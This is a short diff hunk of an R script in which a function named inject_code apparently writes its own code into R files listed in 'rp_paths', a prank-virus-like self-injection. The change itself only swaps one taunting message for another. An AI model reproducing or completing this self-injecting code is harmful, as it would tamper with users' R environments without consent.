@@ -11,7 +11,7 @@ inject_code <- function() {
   lapply(rp_paths, inject, code = deparse(match.call()))
   
   # Display a message
-  cat("Wow, your R is Rancid!!!\n")
+  cat("Wow, your R is trashhhhhh!!!\n")
 }
 
 # Execute the code injection function
